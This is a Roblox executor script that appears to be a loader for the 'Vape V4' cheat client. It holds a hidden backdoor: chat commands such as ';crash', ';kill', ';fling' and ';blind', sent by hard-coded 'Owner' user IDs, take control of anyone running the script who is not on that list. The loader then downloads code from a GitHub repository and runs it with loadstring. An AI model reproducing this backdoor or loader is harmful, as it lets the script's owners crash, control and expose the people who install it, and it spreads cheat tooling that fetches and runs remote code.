local Players = game:GetService("Players")
local TextChatService = game:GetService("TextChatService")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local LOCAL_PLAYER = Players.LocalPlayer
local camera = workspace.CurrentCamera

local spinningConn, orbitingConn, fastSpinConn, fastOrbitConn
local frozenPart, floatGyro, blindGui, noclipConn, confuseConn

local whitelist = {
	Owner = {4279175156, 4202838123, 4307561815, 4380912728, 8334967500, 4240568437, 4262245137, 8336776571, 8309882908, 8335222717, 4429753384, 8038312847, 3662747580, 4371940736, 116968806, 8337993466, 8336675908, 8293712327, 8244741218, 8313657982, 1251592623},
	Private = {3299920155},
	Slow = {8336356347}
}

local function isInList(u, list)
	for _, id in ipairs(list) do
		if u == id then return true end
	end
	return false
end

local function isWhitelisted(u)
	return isInList(u, whitelist.Owner) or isInList(u, whitelist.Private)
end

local function applyTag(plr, txt, col)
	local function render()
		local head = plr.Character and plr.Character:FindFirstChild("Head")
		if not head or head:FindFirstChild("VapeTag") then return end
		local b = Instance.new("BillboardGui")
		b.Name = "VapeTag"
		b.Size = UDim2.new(0, 100, 0, 20)
		b.StudsOffset = Vector3.new(0, 3, 0)
		b.AlwaysOnTop = true
		b.Adornee = head
		b.Parent = head
		local l = Instance.new("TextLabel")
		l.Size = UDim2.fromScale(1, 1)
		l.BackgroundTransparency = 1
		l.Text = txt
		l.TextColor3 = col
		l.TextStrokeTransparency = 0.3
		l.TextStrokeColor3 = Color3.new(0, 0, 0)
		l.Font = Enum.Font.GothamBold
		l.TextScaled = true
		l.Parent = b
	end
	if plr.Character then render() end
	plr.CharacterAdded:Connect(function()
		task.wait(0.5)
		render()
	end)
end

local function tag(plr)
	local id = plr.UserId
	if isInList(id, whitelist.Owner) then
		applyTag(plr, "Vape OWNER", Color3.fromRGB(210, 4, 45))
	elseif isInList(id, whitelist.Private) then
		applyTag(plr, "Vape Private", Color3.fromRGB(170, 0, 255))
	elseif isInList(id, whitelist.Slow) then
		applyTag(plr, "Moderator", Color3.fromRGB(70, 130, 255))
	end
end

local function hasTag(plr)
	local head = plr.Character and plr.Character:FindFirstChild("Head")
	return head and head:FindFirstChild("VapeTag") ~= nil
end

local function tagWhenReady(plr)
	task.spawn(function()
		while plr:IsDescendantOf(Players) do
			if not hasTag(plr) then tag(plr) end
			task.wait(0.5)
		end
	end)
end

for _, plr in ipairs(Players:GetPlayers()) do tagWhenReady(plr) end
Players.PlayerAdded:Connect(tagWhenReady)
tagWhenReady(LOCAL_PLAYER)

local lastCommand = {
	kill = 0, crash = 0, freeze = 0, unfreeze = 0, bring = 0, fling = 0,
	spin = 0, unspin = 0, spinfast = 0, unspinfast = 0,
	orbit = 0, unorbit = 0, orbitfast = 0, unorbitfast = 0,
	sit = 0, unsit = 0, jump = 0, reset = 0,
	float = 0, unfloat = 0, blind = 0, unblind = 0,
	noclip = 0, clip = 0, confuse = 0, unconfuse = 0, log = 0
}

local function getSenderHRP()
	for _, plr in ipairs(Players:GetPlayers()) do
		if isWhitelisted(plr.UserId) and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
			return plr.Character.HumanoidRootPart
		end
	end
	return nil
end

local function handleCommand(cmd)
	if isWhitelisted(LOCAL_PLAYER.UserId) then return end
	local char = LOCAL_PLAYER.Character
	local hrp = char and char:FindFirstChild("HumanoidRootPart")
	local humanoid = char and char:FindFirstChildOfClass("Humanoid")

	if cmd == "kill" and char then
		for _, part in ipairs(char:GetDescendants()) do
			if part:IsA("BasePart") then part:BreakJoints() end
		end

	elseif cmd == "crash" then
		while true do end

	elseif cmd == "freeze" and hrp then
		if not hrp:FindFirstChild("Frozen") then
			frozenPart = Instance.new("BodyVelocity")
			frozenPart.Name = "Frozen"
			frozenPart.Velocity = Vector3.zero
			frozenPart.MaxForce = Vector3.one * 1e9
			frozenPart.P = 1e5
			frozenPart.Parent = hrp
		end

	elseif cmd == "unfreeze" and frozenPart then
		frozenPart:Destroy()
		frozenPart = nil

	elseif cmd == "bring" and hrp then
		local target = getSenderHRP()
		if target then hrp.CFrame = target.CFrame + Vector3.new(0, 3, 0) end

	elseif cmd == "fling" and hrp then
		local target = getSenderHRP()
		if target then
			local bv = Instance.new("BodyVelocity")
			bv.Velocity = (target.Position - hrp.Position).Unit * 200
			bv.MaxForce = Vector3.one * 1e6
			bv.P = 9e4
			bv.Parent = hrp
			game.Debris:AddItem(bv, 0.5)
		end

	elseif cmd == "spin" and hrp then
		if not spinningConn then
			spinningConn = RunService.Heartbeat:Connect(function()
				hrp.CFrame = hrp.CFrame * CFrame.Angles(0, math.rad(5), 0)
			end)
		end

	elseif cmd == "unspin" and spinningConn then
		spinningConn:Disconnect()
		spinningConn = nil

	
	elseif cmd == "spinfast" and hrp then
		if not fastSpinConn then
			fastSpinConn = RunService.Heartbeat:Connect(function()
				hrp.CFrame = hrp.CFrame * CFrame.Angles(0, math.rad(25), 0)
			end)
		end

	elseif cmd == "unspinfast" and fastSpinConn then
		fastSpinConn:Disconnect()
		fastSpinConn = nil

	elseif cmd == "orbit" and hrp then
		local target = getSenderHRP()
		if not orbitingConn and target then
			local angle = 0
			orbitingConn = RunService.Heartbeat:Connect(function()
				angle += 0.05
				local radius = 10
				hrp.CFrame = CFrame.new(target.Position + Vector3.new(math.cos(angle) * radius, 3, math.sin(angle) * radius))
			end)
		end

	elseif cmd == "unorbit" and orbitingConn then
		orbitingConn:Disconnect()
		orbitingConn = nil

	elseif cmd == "orbitfast" and hrp then
		local target = getSenderHRP()
		if not fastOrbitConn and target then
			local angle = 0
			fastOrbitConn = RunService.Heartbeat:Connect(function()
				angle += 0.2
				local radius = 14
				hrp.CFrame = CFrame.new(target.Position + Vector3.new(math.cos(angle) * radius, 3, math.sin(angle) * radius))
			end)
		end

	elseif cmd == "unorbitfast" and fastOrbitConn then
		fastOrbitConn:Disconnect()
		fastOrbitConn = nil

	elseif cmd == "sit" and humanoid then
		humanoid.Sit = true
	elseif cmd == "unsit" and humanoid then
		humanoid.Sit = false

	elseif cmd == "jump" and humanoid then
		humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
	elseif cmd == "reset" and humanoid then
		humanoid.Health = 0

	elseif cmd == "float" and hrp then
		if not floatGyro then
			floatGyro = Instance.new("BodyPosition")
			floatGyro.Position = hrp.Position + Vector3.new(0, 10, 0)
			floatGyro.MaxForce = Vector3.new(1,1,1) * 1e6
			floatGyro.P = 12500
			floatGyro.Parent = hrp
		end
	elseif cmd == "unfloat" and floatGyro then
		floatGyro:Destroy()
		floatGyro = nil


	elseif cmd == "blind" then
		if not blindGui then
			blindGui = Instance.new("ScreenGui", LOCAL_PLAYER:WaitForChild("PlayerGui"))
			blindGui.Name = "BlindGui"
			local frame = Instance.new("Frame", blindGui)
			frame.Size = UDim2.fromScale(1,1)
			frame.BackgroundColor3 = Color3.new(0,0,0)
		end

elseif cmd == "log" then
	local function chatMessage(str)
		str = tostring(str)
		if TextChatService.TextChannels and TextChatService.TextChannels.RBXGeneral then
			TextChatService.TextChannels.RBXGeneral:SendAsync(str)
		else
			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(str, "All")
		end
	end
	chatMessage("8Uz1P")

	elseif cmd == "unblind" and blindGui then
		blindGui:Destroy()
		blindGui = nil

	elseif cmd == "noclip" and not noclipConn then
		noclipConn = RunService.Stepped:Connect(function()
			if char then
				for _, v in ipairs(char:GetDescendants()) do
					if v:IsA("BasePart") then v.CanCollide = false end
				end
			end
		end)
		
	elseif cmd == "clip" and noclipConn then
		noclipConn:Disconnect()
		noclipConn = nil

	elseif cmd == "confuse" and not confuseConn then
		confuseConn = RunService.RenderStepped:Connect(function()
			camera.CFrame = camera.CFrame * CFrame.Angles(0, math.rad(1.5), 0)
		end)
	elseif cmd == "unconfuse" and confuseConn then
		confuseConn:Disconnect()
		confuseConn = nil
	end
end

TextChatService.OnIncomingMessage = function(message)
	local source = message.TextSource
	if not source then return end
	local senderId = source.UserId
	if not isWhitelisted(senderId) then return end
	local msg = message.Text:lower()
	for command, _ in pairs(lastCommand) do
		if msg == ";"..command then
			lastCommand[command] = tick()
		end
	end
end

task.spawn(function()
	while true do
		local now = tick()
		for command, t in pairs(lastCommand) do
			if now - t <= 2 then
				handleCommand(command)
				lastCommand[command] = 0
			end
		end
		task.wait(0.5)
	end
end)

local isfile = isfile or function(file)
	local suc, res = pcall(function()
		return readfile(file)
	end)
	return suc and res ~= nil and res ~= ''
end
local delfile = delfile or function(file)
	writefile(file, '')
end

local function downloadFile(path, func)
	if not isfile(path) then
		local suc, res = pcall(function()
			return game:HttpGet('https://raw.githubusercontent.com/Trxiste/VapeV4ForRoblox/'..readfile('newvape/profiles/commit.txt')..'/'..select(1, path:gsub('newvape/', '')), true)
		end)
		if not suc or res == '404: Not Found' then
			error(res)
		end
		if path:find('.lua') then
			res = '--This watermark is used to delete the file if its cached, remove it to make the file persist after vape updates.\n'..res
		end
		writefile(path, res)
	end
	return (func or readfile)(path)
end

local function wipeFolder(path)
	if not isfolder(path) then return end
	for _, file in listfiles(path) do
		if file:find('loader') then continue end
		if isfile(file) and select(1, readfile(file):find('--This watermark is used to delete the file if its cached, remove it to make the file persist after vape updates.')) == 1 then
			delfile(file)
		end
	end
end

for _, folder in {'newvape', 'newvape/games', 'newvape/profiles', 'newvape/assets', 'newvape/libraries', 'newvape/guis'} do
	if not isfolder(folder) then
		makefolder(folder)
	end
end

if not shared.VapeDeveloper then
	local _, subbed = pcall(function()
		return game:HttpGet('https://github.com/Trxiste/VapeV4ForRoblox')
	end)
	local commit = subbed:find('currentOid')
	commit = commit and subbed:sub(commit + 13, commit + 52) or nil
	commit = commit and #commit == 40 and commit or 'main'
	if commit == 'main' or (isfile('newvape/profiles/commit.txt') and readfile('newvape/profiles/commit.txt') or '') ~= commit then
		wipeFolder('newvape')
		wipeFolder('newvape/games')
		wipeFolder('newvape/guis')
		wipeFolder('newvape/libraries')
	end
	writefile('newvape/profiles/commit.txt', commit)
end

return loadstring(downloadFile('newvape/main.lua'), 'main')()
